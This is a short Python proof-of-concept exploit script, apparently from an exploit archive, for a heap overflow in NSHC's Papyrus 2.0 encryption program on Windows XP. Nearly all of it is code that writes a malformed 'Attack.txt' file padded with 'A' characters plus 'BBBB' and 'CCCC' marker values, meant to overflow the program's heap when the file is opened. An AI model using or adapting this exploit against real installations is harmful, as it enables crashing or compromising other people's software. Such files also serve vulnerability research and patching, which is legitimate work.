#!/usr/bin/python
# 
# Title: NSHC Papyrus Heap Overflow Vulnerability 
# Date: 13\08\2011 
# Author: wh1ant
# Software Link: http://file.atfile.com/ftp/data/03/PapyrusSetup.exe
# Version: 2.0 
# Tested On: windows XP SP3 South Korea / windows XP SP3 English VMware Workstation
# CVE: N/A 
# Notice:
# Encrypt/Decrypt programs that are created by NSHC
#
 
fd = open("Attack.txt", "w")
data = 'A'
for i in range(0, 1003):
 fd.write(data)
fd.write("BBBB");
fd.write("CCCC");
for i in range(0, 2000):
 fd.write(data);
fd.close()